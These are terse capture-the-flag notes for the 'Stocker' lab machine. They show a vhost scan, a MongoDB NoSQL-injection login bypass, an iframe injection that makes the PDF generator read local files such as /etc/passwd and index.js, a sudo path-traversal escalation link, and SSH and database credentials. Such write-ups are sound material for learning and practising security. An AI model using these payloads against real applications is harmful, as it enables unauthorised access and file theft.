`gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain`
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]

`10.10.11.196    stocker.htb dev.stocker.htb`

Login injection for mongodb:

```
POST /login HTTP/1.1
Host: dev.stocker.htb
Content-Length: 55
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.stocker.htb
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dev.stocker.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3A7POPFL-NoqJd_8maxKOJblarsZoqIJXx.xPpxIgFf5VpP9ZRsAiJEkpui1qYM24TahmfC2kfoF%2F0
Connection: close

{"username": {"$ne": null}, "password": {"$ne": null} }
```

Order injection to print **iframe** inside pdf file. There are 3 important files for this box: 

/etc/passwd
/var/www/dev/index.js
/etc/nginx/sites-enabled/default

```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
Content-Length: 241
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://dev.stocker.htb
Referer: http://dev.stocker.htb/stock
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3Aam-M3BRZVIUO-AOVxOaUNRrOccQDxr0P.xrWmJyNTG4%2BagkwkLiB8j6VG9b%2FRa31%2B1oUG5aCTPCc
Connection: close

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup<iframe src='file:///var/www/dev/index.js' width='1000' height='1000'></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

Ssh:
angoose
IHeardPassphrasesArePrettySecure

sudo -l

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/

const prodURI = "mongodb://prod:tsydddRJ7xo4F#4Xg?e3HzA@localhost/prod?authSource=admin&w=1";
const devURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";